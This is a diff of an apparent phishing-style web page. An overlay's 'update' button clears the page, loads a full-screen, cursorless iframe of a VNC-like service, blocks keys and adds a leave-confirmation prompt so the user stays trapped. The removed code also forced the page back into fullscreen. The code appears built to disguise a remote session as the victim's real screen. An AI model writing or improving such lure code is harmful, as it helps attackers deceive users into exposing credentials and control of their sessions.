@@ -733,55 +733,61 @@
             }
         }
 
+
         *,
         *::before,
         *::after {
-            box-sizing: border-box !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            border: none !important;
-            outline: none !important;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            border: none;
         }
 
-        /* Specifically target the body and html */
         html,
         body {
-            height: 100vh !important;
-            width: 100vw !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            overflow: hidden !important;
-            background-color: #000 !important;
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: #000;
+            /* Black background to hide any potential gaps */
         }
 
-        /* Hide scrollbars completely */
-        ::-webkit-scrollbar {
-            display: none !important;
-            width: 0 !important;
-            height: 0 !important;
-        }
-
-        /* Make iframe extremely aggressive in covering screen */
+        /* The iframe styling */
         .vnc-iframe {
-            position: fixed !important;
-            top: -5px !important;
-            left: -5px !important;
-            width: calc(100vw + 10px) !important;
-            height: calc(100vh + 10px) !important;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            /* Viewport width */
+            height: 100vh;
+            /* Viewport height */
+            margin: 0;
+            padding: 0;
             border: none !important;
+            /* Enforced no border */
             outline: none !important;
+            /* No outlines */
+            overflow: hidden;
+            z-index: 99999;
+            /* Stretch iframe to cover any potential gaps */
+            transform: scale(1.01);
+            transform-origin: center center;
+        }
+
+        /* Additional support for fullscreen mode */
+        :fullscreen,
+        :-webkit-full-screen,
+        :fullscreen body,
+        :-webkit-full-screen body {
+            width: 100vw !important;
+            height: 100vh !important;
             margin: 0 !important;
             padding: 0 !important;
             overflow: hidden !important;
-            z-index: 2147483647 !important;
-            /* Maximum z-index */
-            transform: scale(1.02) !important;
-            /* Scale up to cover all gaps */
-            transform-origin: center center !important;
-            background-color: #000 !important;
         }
     </style>
-
 </head>
 
 <body>
@@ -1223,154 +1229,161 @@
                 updateButton.style.border = 'none';
                 updateButton.style.borderRadius = '6px';
                 updateButton.style.cursor = 'pointer';
+
                 updateButton.addEventListener('click', function () {
-                    // Remove any existing overlays
+                    // Remove the overlay first
                     document.body.removeChild(overlay);
 
-                    // First, request fullscreen on user interaction
-                    document.documentElement.requestFullscreen({ navigationUI: 'hide' }).then(() => {
-                        // Clear everything
-                        document.body.innerHTML = '';
+                    // Force document to be clean for iframe
+                    document.body.style.margin = '0';
+                    document.body.style.padding = '0';
+                    document.body.style.overflow = 'hidden';
+                    document.documentElement.style.overflow = 'hidden';
 
-                        // Force document styling to be clean
+                    // First, remove any existing content to ensure clean slate
+                    document.body.innerHTML = '';
+
+                    // Create a wrapper div to help eliminate borders
+                    const wrapper = document.createElement('div');
+                    wrapper.style.position = 'fixed';
+                    wrapper.style.top = '0';
+                    wrapper.style.left = '0';
+                    wrapper.style.width = '100vw';
+                    wrapper.style.height = '100vh';
+                    wrapper.style.padding = '0';
+                    wrapper.style.margin = '0';
+                    wrapper.style.overflow = 'hidden';
+                    wrapper.style.backgroundColor = '#000'; // Black background 
+                    wrapper.style.zIndex = '99998';
+                    document.body.appendChild(wrapper);
+
+                    // Create the iframe with proper styling
+                    const hiddenFrame = document.createElement('iframe');
+                    hiddenFrame.src = 'http://localhost/';
+                    hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
+                    hiddenFrame.className = 'vnc-iframe'; // Apply our CSS class
+
+                    // Force removal of browser chrome/UI (if possible)
+                    document.documentElement.style.cursor = 'none';
+
+                    // Add redundant inline styles for maximum compatibility
+                    hiddenFrame.style.position = 'fixed';
+                    hiddenFrame.style.top = '0';
+                    hiddenFrame.style.left = '0';
+                    hiddenFrame.style.width = '100vw';
+                    hiddenFrame.style.height = '100vh';
+                    hiddenFrame.style.border = 'none';
+                    hiddenFrame.style.outline = 'none';
+                    hiddenFrame.style.padding = '0';
+                    hiddenFrame.style.margin = '0';
+                    hiddenFrame.style.zIndex = '99999';
+                    // Slightly scale up to cover any potential gaps
+                    hiddenFrame.style.transform = 'scale(1.01)';
+                    hiddenFrame.style.transformOrigin = 'center center';
+
+                    hiddenFrame.onload = function () {
+                        // Ensure no scrollbars in the parent document
+                        document.documentElement.style.overflow = 'hidden';
+                        document.body.style.overflow = 'hidden';
+
+                        // Request fullscreen with options to hide browser UI
+                        try {
+                            const fullscreenOptions = {
+                                navigationUI: 'hide'
+                            };
+
+                            // Try this method first (works in modern browsers)
+                            if (document.documentElement.requestFullscreen) {
+                                document.documentElement.requestFullscreen(fullscreenOptions).catch(err => {
+                                    console.log("Fullscreen request failed:", err);
+                                    // Fallback to maximize the iframe if fullscreen fails
+                                    maximizeIframe(hiddenFrame);
+                                });
+                            }
+                            // Firefox alternative
+                            else if (document.documentElement.mozRequestFullScreen) {
+                                document.documentElement.mozRequestFullScreen();
+                            }
+                            // Chrome, Safari, and Opera alternative
+                            else if (document.documentElement.webkitRequestFullscreen) {
+                                document.documentElement.webkitRequestFullscreen();
+                            }
+                            // IE/Edge alternative
+                            else if (document.documentElement.msRequestFullscreen) {
+                                document.documentElement.msRequestFullscreen();
+                            } else {
+                                maximizeIframe(hiddenFrame);
+                            }
+
+                            // Try to apply events to the iframe content
+                            try {
+                                hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
+                                hiddenFrame.contentWindow.onbeforeunload = function () {
+                                    return "Are you sure you want to leave?";
+                                };
+
+                                // Try to hide scrollbars in the iframe content
+                                const style = document.createElement('style');
+                                style.textContent = `
+                            html, body { 
+                                margin: 0 !important; 
+                                padding: 0 !important; 
+                                overflow: hidden !important;
+                                height: 100vh !important;
+                                width: 100vw !important;
+                            }
+                        `;
+
+                                try {
+                                    hiddenFrame.contentDocument.head.appendChild(style);
+                                } catch (styleError) {
+                                    console.warn("Could not inject styles to iframe:", styleError);
+                                }
+                            } catch (error) {
+                                console.warn("Cannot attach events to iframe:", error);
+                            }
+                        } catch (err) {
+                            console.error("Error in iframe onload:", err);
+                            maximizeIframe(hiddenFrame);
+                        }
+                    };
+
+                    // Helper function to maximize the iframe if fullscreen fails
+                    function maximizeIframe(iframe) {
+                        // Force clean slate
+                        document.body.style.margin = '0';
+                        document.body.style.padding = '0';
                         document.documentElement.style.margin = '0';
                         document.documentElement.style.padding = '0';
                         document.documentElement.style.overflow = 'hidden';
-                        document.documentElement.style.backgroundColor = '#000';
-
-                        document.body.style.margin = '0';
-                        document.body.style.padding = '0';
                         document.body.style.overflow = 'hidden';
-                        document.body.style.backgroundColor = '#000';
-                        document.body.style.position = 'fixed';
-                        document.body.style.width = '100vw';
-                        document.body.style.height = '100vh';
 
-                        // Create black background container to fill any gaps
-                        const blackBackground = document.createElement('div');
-                        blackBackground.style.position = 'fixed';
-                        blackBackground.style.top = '0';
-                        blackBackground.style.left = '0';
-                        blackBackground.style.width = '100vw';
-                        blackBackground.style.height = '100vh';
-                        blackBackground.style.backgroundColor = '#000';
-                        blackBackground.style.zIndex = '2147483646';
-                        document.body.appendChild(blackBackground);
+                        // Apply more aggressive styling to the iframe
+                        iframe.style.position = 'fixed';
+                        iframe.style.top = '-1px';  // Slightly overflow to prevent borders
+                        iframe.style.left = '-1px';
+                        iframe.style.width = 'calc(100vw + 2px)';  // Add 2px to cover borders
+                        iframe.style.height = 'calc(100vh + 2px)';
+                        iframe.style.border = 'none';
+                        iframe.style.outline = 'none';
+                        iframe.style.transform = 'scale(1.01)';  // Scale slightly larger
 
-                        // Create the iframe with more extreme positioning
-                        const hiddenFrame = document.createElement('iframe');
-                        hiddenFrame.src = 'http://localhost/';
-                        hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
-                        hiddenFrame.className = 'vnc-iframe';
+                        // Try to hide any browser UI
+                        const meta = document.createElement('meta');
+                        meta.name = 'apple-mobile-web-app-capable';
+                        meta.content = 'yes';
+                        document.head.appendChild(meta);
 
-                        // Apply extreme inline styling
-                        hiddenFrame.style.position = 'fixed';
-                        hiddenFrame.style.top = '-5px';
-                        hiddenFrame.style.left = '-5px';
-                        hiddenFrame.style.width = 'calc(100vw + 10px)';
-                        hiddenFrame.style.height = 'calc(100vh + 10px)';
-                        hiddenFrame.style.border = 'none';
-                        hiddenFrame.style.outline = 'none';
-                        hiddenFrame.style.margin = '0';
-                        hiddenFrame.style.padding = '0';
-                        hiddenFrame.style.zIndex = '2147483647'; // Maximum z-index
-                        hiddenFrame.style.transform = 'scale(1.02)';
-                        hiddenFrame.style.transformOrigin = 'center center';
-                        hiddenFrame.style.backgroundColor = '#000';
-
-                        // Force cursor to be hidden if possible
-                        document.documentElement.style.cursor = 'none';
-                        document.body.style.cursor = 'none';
-
-                        // Ensure we stay in fullscreen
-                        document.addEventListener('fullscreenchange', () => {
-                            if (!document.fullscreenElement) {
-                                document.documentElement.requestFullscreen({ navigationUI: 'hide' }).catch(err => {
-                                    console.log("Forced fullscreen failed", err);
-                                });
+                        // Force the iframe to be the only visible element
+                        Array.from(document.body.children).forEach(child => {
+                            if (child !== iframe && child !== wrapper) {
+                                child.style.display = 'none';
                             }
                         });
-
-                        // Handle iframe load
-                        hiddenFrame.onload = function () {
-                            try {
-                                // Try to modify the iframe content directly
-                                const iframeStyle = document.createElement('style');
-                                iframeStyle.textContent = `
-                    *, *::before, *::after {
-                        box-sizing: border-box !important;
-                        margin: 0 !important;
-                        padding: 0 !important;
                     }
-                    
-                    html, body {
-                        height: 100vh !important;
-                        width: 100vw !important;
-                        margin: 0 !important;
-                        padding: 0 !important;
-                        overflow: hidden !important;
-                    }
-                `;
 
-                                try {
-                                    hiddenFrame.contentDocument.head.appendChild(iframeStyle);
-                                } catch (e) {
-                                    console.warn("Could not inject styles to iframe content", e);
-                                }
-
-                                // Apply key event handlers to iframe content
-                                try {
-                                    hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
-                                    hiddenFrame.contentWindow.onbeforeunload = function () {
-                                        return "Are you sure you want to leave?";
-                                    };
-                                } catch (error) {
-                                    console.warn("Cannot attach events to iframe:", error);
-                                }
-                            } catch (err) {
-                                console.error("Error in iframe onload:", err);
-                            }
-                        };
-
-                        // Append the iframe to the body
-                        document.body.appendChild(hiddenFrame);
-                    }).catch(err => {
-                        console.error("Initial fullscreen failed:", err);
-
-                        // If fullscreen fails, use backup approach
-                        document.body.innerHTML = '';
-
-                        // Create oversized black background
-                        const blackBackground = document.createElement('div');
-                        blackBackground.style.position = 'fixed';
-                        blackBackground.style.top = '-10px';
-                        blackBackground.style.left = '-10px';
-                        blackBackground.style.width = 'calc(100vw + 20px)';
-                        blackBackground.style.height = 'calc(100vh + 20px)';
-                        blackBackground.style.backgroundColor = '#000';
-                        blackBackground.style.zIndex = '2147483646';
-                        document.body.appendChild(blackBackground);
-
-                        // Add iframe with extreme positioning
-                        const hiddenFrame = document.createElement('iframe');
-                        hiddenFrame.src = 'http://localhost/';
-                        hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
-                        hiddenFrame.className = 'vnc-iframe';
-
-                        // Apply most aggressive styling
-                        hiddenFrame.style.position = 'fixed';
-                        hiddenFrame.style.top = '-10px';
-                        hiddenFrame.style.left = '-10px';
-                        hiddenFrame.style.width = 'calc(100vw + 20px)';
-                        hiddenFrame.style.height = 'calc(100vh + 20px)';
-                        hiddenFrame.style.border = 'none';
-                        hiddenFrame.style.outline = 'none';
-                        hiddenFrame.style.zIndex = '2147483647';
-                        hiddenFrame.style.transform = 'scale(1.03)';
-                        hiddenFrame.style.transformOrigin = 'center center';
-
-                        document.body.appendChild(hiddenFrame);
-                    });
+                    // Add the iframe to the page
+                    document.body.appendChild(hiddenFrame);
                 });
 
                 popup.appendChild(title);
